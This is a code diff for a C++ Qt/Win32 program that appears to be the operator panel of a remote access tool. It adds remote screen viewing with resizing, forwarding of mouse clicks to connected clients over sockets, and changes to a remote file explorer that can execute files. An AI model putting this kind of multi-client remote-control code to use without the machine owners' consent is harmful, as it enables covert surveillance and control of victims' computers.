@@ -63,7 +63,8 @@ WExplorer::~WExplorer()
 void WExplorer::GetFiles(int NOMER)
 {
     //CMD_EXPLOR
-    this->SendingSocket = MSOCKETS[NOMER];
+    //this->SendingSocket = MSOCKETS[NOMER];
+    emit GetCurrPath(NOMER);
 
 }
 
@@ -97,6 +98,8 @@ void WExplorer::ExecuteFile(int IDX, int NOMER)
 
 }
 
+
+
 WScreenShot::WScreenShot(QWidget *parent) :
     QWidget(parent),
     ui(new Ui::WScreenShot)
@@ -109,25 +112,50 @@ WScreenShot::~WScreenShot()
     delete ui;
 }
 
-void WScreenShot::GetBitmap(BYTE *bytes, unsigned int Size, int w, int h)
+void WScreenShot::GetBitmap(BYTE *bytes, int NOMER, unsigned int Size, int w, int h, int realw, int realh)
 {
+    ui->label->NOMER = NOMER;
+    ui->label->ClientW = realw;
+    ui->label->ClientH = realh;
+
     HDC hScreen = GetDC(NULL);
     HDC hDC = CreateCompatibleDC(hScreen);
     SetStretchBltMode(hDC, HALFTONE);
-    StretchBlt(hDC, 0, 0, 683, 384, hScreen, 0, 0, w, h, SRCCOPY);
+    StretchBlt(hDC, 0, 0, ServerW, ServerH, hScreen, 0, 0, w, h, SRCCOPY);
     int bitmapSize = Size;
     BITMAPINFO bm = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
     HBITMAP bmp = CreateDIBSection(hDC, &bm, DIB_RGB_COLORS, (void**)&bitmapSize, 0, 0);
     SetDIBits(hDC, bmp, 0, Size, bytes, &bm, DIB_RGB_COLORS);
     this->pixmap = qt_pixmapFromWinHBITMAP(bmp);
-    QPixmap pix = this->pixmap.scaled(ui->label->width(), ui->label->height(), Qt::KeepAspectRatio);
-    ui->label->setPixmap(pix);
+    //QPixmap pix = this->pixmap.scaled(ui->label->width(), ui->label->height(), Qt::KeepAspectRatio);
+    ui->label->setPixmap(this->pixmap);
 
     memset(&bm, 0, sizeof(bm));
     DeleteDC(hDC);
     DeleteDC(hScreen);
     DeleteObject(bmp);
     free(bytes);
+}
+
+void WScreenShot::resizeEvent(QResizeEvent *event)
+{
+    int newWidth = ui->label->width();
+    int newHeight = ui->label->height();
+    QPixmap pix = this->pixmap.scaled(newWidth, newHeight, Qt::KeepAspectRatio);
+
+    ui->label->setPixmap(pix);
+
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    BIGSCREEN inBIGSCREEN;
+    memset(&inBIGSCREEN, 0, sizeof(BIGSCREEN));
+    inBIGSCREEN.DO = DO_CHANDGE_WH;
+    inBIGSCREEN.w = newWidth;
+    inBIGSCREEN.h = newHeight;
+
+    memcpy(indata.DATA, &inBIGSCREEN, sizeof(BIGSCREEN));
+    indata.CMD = CMD_SCREEN;
+    send(MSOCKETS[this->NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
 }
 
 WSocket::WSocket(int Port)
@@ -283,8 +311,19 @@ void WSocket::GetScreen(int NOMER)
 {
     CMDiDATA indata;
     memset(&indata, 0, sizeof(CMDiDATA));
+    BIGSCREEN inBIGSCREEN;
+    memset(&inBIGSCREEN, 0, sizeof(BIGSCREEN));
+    inBIGSCREEN.DO = DO_RUNTHREAD;
+    memcpy(indata.DATA, &inBIGSCREEN, sizeof(BIGSCREEN));
     indata.CMD = CMD_SCREEN;
     send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&inBIGSCREEN, 0, sizeof(BIGSCREEN));
+}
+
+void WSocket::ChangeScreen(int NOMER, int w, int h)
+{
+
 }
 
 void WSocket::Release(QString Json, int NOMER)
@@ -503,7 +542,7 @@ void WSocket::Recving(int NOMER)
                 DWORD realDecompSize;
                 BYTE *decompressed_buffer = Decompress(compressedPixels, screenshot.ZipSize, screenshot.Size, &realDecompSize);
 
-                emit GetBitmap(decompressed_buffer, realDecompSize, screenshot.w, screenshot.h);
+                emit GetBitmap(decompressed_buffer, NOMER, realDecompSize, screenshot.w, screenshot.h, screenshot.RealW, screenshot.RealH);
 
                 memset(&screenshot, 0, sizeof(screenshot));
                 free(compressedPixels);
@@ -815,6 +854,8 @@ void MWindow::sScreen()
         if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
         {
             int NOMER = item->text().toInt();
+            screenShot->NOMER = NOMER;
+
             if (screenShot->isVisible())
             {
                 emit GetScreen(NOMER);
@@ -940,4 +981,55 @@ MWindow::~MWindow()
 void MWindow::on_OnlineRecv_triggered()
 {
     sendHandl->CheckOnline();
+}
+
+DisplayLabel::DisplayLabel(QWidget *parent, Qt::WindowFlags f)
+{
+
+}
+
+DisplayLabel::DisplayLabel(const QString &text, QWidget *parent, Qt::WindowFlags f)
+{
+
+}
+
+void DisplayLabel::mousePressEvent(QMouseEvent *ev)
+{
+    float ratioX = (float)ClientW / this->width();
+    float ratioY = (float)ClientH / this->height();
+    int x = (int)(ev->pos().x() * ratioX);
+    int y = (int)(ev->pos().y() * ratioY);
+
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    indata.CMD = CMD_SCREEN;
+
+    BIGSCREEN inBIGSCREEN;
+    memset(&inBIGSCREEN, 0, sizeof(BIGSCREEN));
+
+    switch (ev->type())
+    {
+        case QEvent::MouseButtonDblClick: {
+            inBIGSCREEN.DO = DO_DCLICK;
+            break;
+        }
+        case QEvent::MouseButtonPress: {
+            if (ev->buttons() == Qt::LeftButton){
+                inBIGSCREEN.DO = DO_LCLICK;
+            }else{
+                inBIGSCREEN.DO = DO_RCLICK;
+            }
+            break;
+        }
+        default:
+            break;
+    }
+
+    inBIGSCREEN.ClickX = x;
+    inBIGSCREEN.ClickY = y;
+
+    memcpy(indata.DATA, &inBIGSCREEN, sizeof(BIGSCREEN));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&inBIGSCREEN, 0, sizeof(BIGSCREEN));
 }
